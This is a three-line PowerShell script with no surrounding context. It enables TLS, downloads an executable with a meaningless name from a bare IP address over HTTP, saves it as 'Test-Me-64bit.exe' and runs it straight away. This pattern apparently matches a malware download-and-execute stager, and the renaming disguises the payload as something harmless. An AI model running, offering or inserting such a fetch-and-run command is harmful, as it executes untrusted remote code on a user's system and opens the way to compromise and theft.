[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Tls,Tls11,Tls12'

Invoke-WebRequest -Uri 'http://89.208.107.201/Ssterdtre.exe' -OutFile Test-Me-64bit.exe

.\Test-Me-64bit.exe
